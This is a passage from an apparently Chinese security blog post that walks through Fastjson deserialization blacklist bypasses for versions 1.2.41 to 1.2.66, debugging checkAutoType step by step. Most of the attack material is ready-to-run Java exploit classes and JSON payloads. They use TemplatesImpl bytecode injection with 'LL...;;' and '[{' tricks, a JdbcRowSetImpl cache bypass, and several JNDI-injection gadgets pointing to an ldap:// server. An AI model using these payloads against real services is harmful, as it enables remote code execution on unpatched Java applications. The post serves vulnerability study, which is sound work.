&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408310015033.png" alt="image-20240831001535905"></p><p>然后来看一下具体的绕过原理</p><p>先去看一下checkAutoType函数在哪里被调用</p><p><img src="https://cdn.clown2024.cn/202408310022516.png" alt="image-20240831002214426"></p><p>我们可以对比之前的版本来看，之前的版本是直接loadClass了，我们进到这个函数里面看看</p><p><img src="https://cdn.clown2024.cn/202408310026977.png" alt="image-20240831002652886"></p><p>这里我们如果设置了autoTypeSupport为true他就会去将我们的这个类去匹配白名单，匹配到了就loadClass</p><p>如果没匹配到就会进到下面黑名单的匹配</p><p><img src="https://cdn.clown2024.cn/202408310030353.png" alt="image-20240831003005272"></p><p>匹配到黑名单就会抛出异常<strong>autoType is not support</strong></p><p><img src="https://cdn.clown2024.cn/202408310032079.png" alt="image-20240831003254981"></p><p>如果没有开启autoTypeSupport就会先匹配黑名单再匹配白名单</p><p>最后如果要是黑白名单都匹配不到，autoTypeSupport为true且expectClass不为null就直接loadClass</p><p><img src="https://cdn.clown2024.cn/202408310036025.png" alt="image-20240831003602958"></p><p>否则就不加载这个类了直接，我们payload最后进到的就是黑白名单都加载不到的loadClass，我们进loadClass方法里面看一下</p><p><img src="https://cdn.clown2024.cn/202408310039880.png" alt="image-20240831003942791"></p><p>这里就遇到了我们前面提到的用来绕过的地方</p><p>先看第一个箭头处的代码，如果类名的字符串以[开头，则说明该类是一个数组类型，需要递归调用loadClass方法来加载数组元素类型对应的class对象然后使用Array.newInstance方法来创建一个空数组对象，最后返回该数组对象的class对象</p><p>第二个箭头处的代码，如果类名的字符串以L开头并以;结尾，则说明该类是一个普通的Java类，需要把开头的L和结尾的;给去掉，然后递归调用loadClass</p><p>那其实就很清晰了，很容易就明白我们前面payload的绕过原理</p><blockquote><p>不用[的原因是fastjson在前面已经判断过是否为数组了，实际走不到这一步</p></blockquote><p>绕过就两步</p><ol><li>开启autoTypeSupport</li><li>L开头;结尾</li></ol><p>不过这个参数要在服务端手动开启，默认为false启用白名单，有点不好利用我感觉</p><h1 id="fastjson1242"><a href="#FastJson1-2-42" class="headerlink" title="FastJson1.2.42"></a>FastJson1.2.42</h1><p>该版本修改了下面两点：</p><ul><li>黑名单改为了hash值，防止绕过</li><li>对于传入的类名，删除开头<code>L</code>和结尾的<code>;</code></li></ul><p><img src="https://cdn.clown2024.cn/202408310051883.png" alt="image-20240831005115787"></p><blockquote><p>笑死了，文章还没看完猜测是不是就提前校验删了一次，直接猜双写能不能绕过，结果真绕过去了🤣</p></blockquote><p>看一下他的checkAutoType函数变化</p><p><img src="https://cdn.clown2024.cn/202408311524654.png" alt="image-20240831152406512"></p><p>总之这里就是对字符串进行了截取但只截取了一次</p><p>TemplatesImpl的exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.42</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>; <span class="hljs-comment">//前面加了L，结尾加了; 进行了双写绕过</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="fastjson1243"><a href="#FastJson1-2-43" class="headerlink" title="FastJson1.2.43"></a>FastJson1.2.43</h1><p>这个版本又是修改了checkAutoType函数，这次对于LL等开头结尾的字符串直接抛出异常</p><p>上面payload执行结果</p><p><img src="https://cdn.clown2024.cn/202408311527303.png" alt="image-20240831152750175"></p><p>看一下checkAutoType函数</p><p><img src="https://cdn.clown2024.cn/202408311530201.png" alt="image-20240831153008103"></p><p>这里直接就抛异常了</p><p>但是没有对[进行限制，可以通过[{来绕过，改后的exp如下</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-comment">//FastJson1.2.43</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>); <span class="hljs-comment">//开启AutoTypeSupport</span><br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>; <span class="hljs-comment">//用[&#123;来绕过</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;[&#123;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311541263.png" alt="image-20240831154143113"></p><p>分析一下这个payload的原理，首先前面我们知道只加一个[是可以进入loadClass里面的，但是此时会json解析错误</p><p><img src="https://cdn.clown2024.cn/202408311550012.png" alt="image-20240831155047869"></p><p>这里说期待一个[但是在第七十一位置是’,’，就是TemplatesImpl后面那个逗号的位置</p><p>那我们就补上一个[</p><p><img src="https://cdn.clown2024.cn/202408311554785.png" alt="image-20240831155444662"></p><p>然后又说缺少一个{，那再补上去即可</p><blockquote><p>不过怪怪的这就能解析成功了？😢</p></blockquote><h1 id="fastjson1225-1247通杀"><a href="#FastJson1-2-25-1-2-47通杀" class="headerlink" title="FastJson1.2.25-1.2.47通杀"></a>FastJson1.2.25-1.2.47通杀</h1><p><strong>影响版本</strong></p><p>1.2.25-1.2.32:</p><p>未开启AutoTypeSupport时能成功利用，开启了反而不行</p><p>1.2.33-1.2.47:</p><p>无论是否开启AutoTypeSupport都能成功利用</p><p><strong>其他的限制</strong></p><p>基于RMI利用的JDK版本&lt;&#x3D;6u141、7u131、8u121，基于LDAP利用的JDK版本&lt;&#x3D;6u211、7u201、8u191</p><h2 id="1225ltx3dfastjsonltx3d1232"><a href="#1-2-25" class="headerlink" title="1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32"></a>1.2.25&lt;&#x3D;Fastjson&lt;&#x3D;1.2.32</h2><p>先给出exp，这里用的JdbcRowSetImpl的链子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Fastjson6</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;a\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;    \&quot;b\&quot;:&#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;,\n&quot;</span> +<br>                <span class="hljs-string">&quot;        \&quot;autoCommit\&quot;:true\n&quot;</span> +<br>                <span class="hljs-string">&quot;    &#125;\n&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408311634449.png" alt="image-20240831163451309"></p><p>整体思路：通过java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。</p><p>去看一下他的checkAutoType函数来分析一下</p><p><img src="https://cdn.clown2024.cn/202408311638035.png" alt="image-20240831163822049"></p><p>我们先从缓存中去获取这个类，然后为null直接到findClass这里，这里的缓存mapping在一开始的时候会自动执行静态代码块放一些类进去</p><p><img src="https://cdn.clown2024.cn/202408311643708.png" alt="image-20240831164311603"></p><p>然后遍历buckets，根据键值查找是否存在该类，这里是可以直接找到的，然后判断clazz不为空后直接返回</p><p>然后一路往下走到deserialize的地方</p><p><img src="https://cdn.clown2024.cn/202408311646395.png" alt="image-20240831164635293"></p><p>这里调用的是**MiscCodec.deserialze()**，走进去跟进</p><p><img src="https://cdn.clown2024.cn/202408311649743.png" alt="image-20240831164903622"></p><p>往下到这里，判断键值是否为val，是的话再提取val键对应的值赋给objVal变量，而objVal在后面会赋值给strVal变量</p><p><img src="https://cdn.clown2024.cn/202408311650152.png" alt="image-20240831165057048"></p><p>这里赋值了给strVal</p><p>然后继续往下</p><p><img src="https://cdn.clown2024.cn/202408311658049.png" alt="image-20240831165810941"></p><p>判断clazz是否为Class.class，然后到这里loadClass</p><p><img src="https://cdn.clown2024.cn/202408311659949.png" alt="image-20240831165951852"></p><p>load完之后就会放入缓存中</p><p>然后在扫描第二部分JSON数据的时候，由于我们的类已经被放在缓存中了，我们在前面的**TypeUtils.getClassFromMapping(typeName)**就能获取到clazz，然后直接返回</p><p><img src="https://cdn.clown2024.cn/202408311703708.png" alt="image-20240831170308601"></p><p>可以看到直接返回从而绕过了checkAutoType</p><p>然后如果开启了autoTypeSupport的话就会无法绕过前面的黑名单，所以开启了反而不行</p><p><img src="https://cdn.clown2024.cn/202408311704028.png" alt="image-20240831170428910"></p><h2 id="1233ltx3dfastjsonltx3d1247"><a href="#1-2-33" class="headerlink" title="1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47"></a>1.2.33&lt;&#x3D;Fastjson&lt;&#x3D;1.2.47</h2><p>这部分的版本开了autoTypeSupport是可以成功</p><p><strong>未开启autoType时</strong></p><p>这里就和前面一样就不用分析了</p><p><strong>开启autoType时</strong></p><p>这里checkAutoType改了一点地方</p><p><img src="https://cdn.clown2024.cn/202408311724426.png" alt="image-20240831172445310"></p><p>这里多了一个判断，需要**TypeUtils.getClassFromMapping(typeName)**返回为null才行，我们这里返回不为null自然也不会抛出异常</p><h1 id="fastjson1248-1268"><a href="#Fastjson1-2-48-1-2-68" class="headerlink" title="Fastjson1.2.48-1.2.68"></a>Fastjson1.2.48-1.2.68</h1><p>这部分版本很多都是用黑名单绕过的利用方式，参考文章：<a href="https://www.anquanke.com/post/id/232774">https://www.anquanke.com/post/id/232774</a></p><h2 id="fastjsonltx3d1262"><a href="#Fastjson" class="headerlink" title="Fastjson&lt;&#x3D;1.2.62"></a>Fastjson&lt;&#x3D;1.2.62</h2><p>一样先给个payload</p><p>org.apache.xbean.propertyeditor.JndiConverter类的toObjectImpl()函数存在JNDI注入漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&quot;@type&quot;:&quot;org.apache.xbean.propertyeditor.JndiConverter&quot;,&quot;AsText&quot;:&quot;ldap://127.0.0.1:9999/zoZdyoJH&quot;&#125;;<br></code></pre></td></tr></table></figure><p>exp如下：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-comment">//fastjson1.2.62</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Advanced_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;&#125;&quot;</span>;<br>        JSON.parse(poc);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该利用方式还需要我们满足一些前置条件：</p><ul><li><p>需要开启AutoType；</p></li><li><p>Fastjson &lt;&#x3D; 1.2.62；</p></li><li><p>JNDI注入利用所受的JDK版本限制；</p></li><li><p>目标服务端需要存在xbean-reflect包；</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><p><img src="https://cdn.clown2024.cn/202408312240189.png" alt="image-20240831224018027"></p><p><strong>调试分析</strong></p><p>先根据payload看一下利用的点</p><p>看一下关键类<strong>JndiConverter</strong>的jndi利用点</p><p><img src="https://cdn.clown2024.cn/202409010012684.png" alt="image-20240901001248560"></p><p>那就是需要我们的set方法能够触发到该类，然后看payload可以知道是触发了一个<strong>setAsText</strong>方法，但是这个类没有，那就应该是在父类里面，我们可以往上查找调用类，最终是找到了一个<strong>AbstractConverter</strong>的类</p><p><img src="https://cdn.clown2024.cn/202409010015651.png" alt="image-20240901001557551"></p><p><img src="https://cdn.clown2024.cn/202409010016240.png" alt="image-20240901001634139"></p><p>他这里调用了toObject方法</p><p><img src="https://cdn.clown2024.cn/202409010017706.png" alt="image-20240901001722611"></p><p>然后调用了toObjectImpl方法，最终到我们执行jndi的地方</p><p>利用链的流程知道了，现在来看一下checkAutoType函数的流程，主要是看看他新增的逻辑，这里分析的是开启autoTypeSupport的时候</p><p><img src="https://cdn.clown2024.cn/202409010028755.png" alt="image-20240901002806625"></p><p>这里会先进到第一部分的黑白名单判断，由于该类不在黑白名单内就直接往下走</p><p><img src="https://cdn.clown2024.cn/202409010032724.png" alt="image-20240901003236610"></p><p>一路走到这个类，此时clazz为null且开启了autoTypeSupport，就直接loadClass，后面就是正常的反序列化流程了</p><p><strong>未开启autoTypeSupport</strong></p><p><img src="https://cdn.clown2024.cn/202409010037003.png" alt="image-20240901003743874"></p><p>他会进到这里的判断逻辑，也是正常的黑白名单校验直接过去，主要的是他会走到下面这个地方</p><p><img src="https://cdn.clown2024.cn/202409010039269.png" alt="image-20240901003925151"></p><p>这里会直接抛异常所以也就不会loadClass了</p><h2 id="fastjson1266"><a href="#Fastjson1-2-66" class="headerlink" title="Fastjson1.2.66"></a>Fastjson1.2.66</h2><p>该版本也是黑名单绕过，1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p><p>给出各链子的payload</p><p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br>或<br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;UserTransaction&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://127.0.0.1:9999/xCxXLJwZ&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>满足条件：</p><ul><li>开启AutoType；</li><li>Fastjson &lt;&#x3D; 1.2.66；</li><li>JNDI注入利用所受的JDK版本限制；</li><li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li><li>br.com.anteros.dbcp.AnterosDBCPConfig类需要Anteros-Core和Anteros-DBCP包；</li><li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li></ul><p>emmm我调试了一下1.2.62的payload，发现他的判断逻辑没有什么变化，只是把黑名单增加了应该是，所以直接在黑名单处被检测到然后抛出异常</p><p><img src="https://cdn.clown2024.cn/202409010044210.png" alt="image-20240901004414066"></p><p>所以autoType的部分就不分析了，就看各payload的利用链就好</p><p><strong>org.apache.shiro.realm.jndi.JndiRealmFactory</strong></p><p>先导入依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.shiro<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>shiro-core<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.JNDITest;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shiro_Version</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        String payload=<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://127.0.0.1:9999/zoZdyoJH\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409010104683.png" alt="image-20240901010441536"></p><p>我们直接去看一下<strong>JndiRealmFactory</strong>这个类，发现他的getRealms方法存在JNDI注入</p><p><img src="https://cdn.clown2024.cn/202409010113706.png" alt="image-20240901011300563"></p><p>然后是遍历jndiNames来传入参数，所以这里payload设置一个jndiNames数组</p><p>get方法调用：</p><p>至于这里为什么调用get而不是set，也补充一下前面没有提到这个</p><p>还记得前面有对各种方法和字段遍历的JavaBeanInfo的封装吧</p><p><img src="https://cdn.clown2024.cn/202409010144471.png" alt="image-20240901014448343"></p><p>这个版本虽然改了一点，但不影响目前的分析，这个箭头所指的就是在遍历类的get方法，我们看一下执行了什么操作</p><p><img src="https://cdn.clown2024.cn/202409010150192.png" alt="image-20240901015008065"></p><p>这里对返回值的类型进行了判断，如果为符合的类型进到逻辑里面，我们这里传的是[]且get方法返回值为Collection符合返回值为Collection的情况所以会继续往下</p><p><img src="https://cdn.clown2024.cn/202409010210700.png" alt="image-20240901021056578"></p><p>然后如果类里面没有set方法就会走到这里遍历get方法的这一步，不然就会进入到上一步的continue，因为前面的一个遍历method是优先set方法，最后同样是add进了fieldList</p><p>然后跟进去newFieldInfo里面，这里要注意一个重要的属性<strong>getOnly</strong></p><p><img src="https://cdn.clown2024.cn/202409010215166.png" alt="image-20240901021533021"></p><p>在这里面将getOnly赋值为了true</p><p>然后一路跟进最后会进到这个方法</p><p><img src="https://cdn.clown2024.cn/202409010221406.png" alt="image-20240901022101254"></p><p>此时getOnly已经为true，继续往下</p><p><img src="https://cdn.clown2024.cn/202409010221503.png" 